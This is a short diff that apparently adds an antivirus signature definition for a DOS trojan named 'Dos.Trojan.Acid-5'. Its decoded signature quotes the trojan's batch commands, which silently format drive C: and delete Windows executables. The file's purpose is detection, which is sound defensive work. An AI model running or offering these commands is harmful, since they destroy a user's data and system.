@@ -1,0 +1,9 @@
+VIRUS NAME: Dos.Trojan.Acid-5
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+CID Gold...
+rem X
+echo y| format c: /q /u > c:\garbage
+echo y| del c:\windows\*.exe > c:\garbage
+mkdir c:\t
